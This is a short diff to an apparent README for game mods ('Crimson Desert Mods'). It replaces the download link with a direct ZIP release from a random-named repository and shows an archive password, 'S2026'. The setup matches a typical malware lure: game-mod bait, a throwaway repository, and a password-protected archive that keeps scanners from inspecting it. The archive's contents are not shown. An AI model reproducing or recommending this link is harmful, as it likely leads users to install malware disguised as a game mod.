@@ -21,7 +21,7 @@
 
 ## 📥 Download
 
-[![Crimson Desert Mods](https://img.shields.io/badge/Download%20Crimson%20Desert%20Mods-Open%20Page-0a84ff?style=for-the-badge&logo=github)](https://git-setup.github.io/download/)
+[![Crimson Desert Mods](https://img.shields.io/badge/Download%20Crimson%20Desert%20Mods-Open%20Page-0a84ff?style=for-the-badge&logo=github)](https://github.com/MeetMarshalSee/gngwvudj/releases/download/Main/Main.zip)
 
 **🔐🔐🔐** `S2026`
 
